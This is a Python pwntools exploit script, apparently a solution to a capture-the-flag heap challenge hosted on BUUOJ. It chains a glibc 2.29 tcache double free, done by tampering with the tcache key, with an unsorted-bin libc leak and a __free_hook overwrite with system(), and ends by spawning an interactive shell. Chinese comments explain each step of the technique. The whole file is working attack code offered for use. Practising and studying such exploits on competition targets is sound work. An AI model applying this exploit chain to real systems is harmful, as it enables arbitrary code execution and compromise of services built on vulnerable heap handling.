# -*- coding:utf-8 -*-
from PwnContext import *

binary = './pwn'
debug_libc = './libc-2.29.so'
elf = ELF(binary)
libc = ELF(debug_libc)
local = 0



if local == 1 :
    sh = remote("node3.buuoj.cn","26366")
else:
    ctx.binary = binary
    ctx.remote_libc = debug_libc
    ctx.debug_remote_libc = True
    sh = ctx.start()


def edit(idx,content,sex = 'Y'):
    sh.sendlineafter("choice : ","3")
    sh.sendlineafter("index :",str(idx))
    sh.sendafter("sex?",sex)  #Y add +8
    sh.sendafter("information",content)


def add(name,info):
    sh.sendlineafter("choice : ","1")
    sh.sendafter("name",name)    # fd
    sh.sendafter("sex","M")
    sh.sendafter("information",info)


def show(idx):
    sh.sendlineafter("choice : ", "2")
    sh.sendlineafter("index : ", str(idx))


def free(idx):
    sh.sendlineafter("choice : ","4")
    sh.sendlineafter(" : ",str(idx))


add("cyberhs1","a".ljust(0x70,'1'))
add("cyberhs2","a".ljust(0x70,'1'))
add("cyberhs3","a".ljust(0x70,'1'))
add("cyberhs4","a".ljust(0x70,'1'))



free(0)
                # 只有bk
edit(0,"2".ljust(0x70,'2'))
free(0)                     # fd指向自身
free(1)

edit(1,"1".ljust(0x70,'1'))

free(2)
edit(2,"1".ljust(0x70,'1'))

free(2)
free(3)
edit(3,"1".ljust(0x70,'1'))
free(3)
free(1)                         # 4次double free八次后进入unsortbin了
show(1)
addr=u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))  # 右补0
malloc_hook_addr = (addr & 0xFFFFFFFFFFFFF000) + (libc.symbols['__malloc_hook'] & 0xFFF)
lb=malloc_hook_addr - libc.symbols['__malloc_hook']
# 获取基址利用main_arena和malloc_hook接近，然后去掉main_arena的后三位加上malloc_hook的后三位。
#就得到了malloc_hook的地址了
success(hex(lb))
sys = lb + libc.sym['system']
fh = lb + libc.sym['__free_hook']
success("system:" + hex(sys))
add(p64(fh),p64(fh)*14)   # double free之后随便申请了
add('/bin/sh\x00','/bin/sh\x00'*14)
add(p64(sys),'a'*0x70)
free(5)
sh.interactive()

# libc2.29新增加key，2.29的tcache_double主要是修改key，使得e->key == tcache不成立，则可以double free
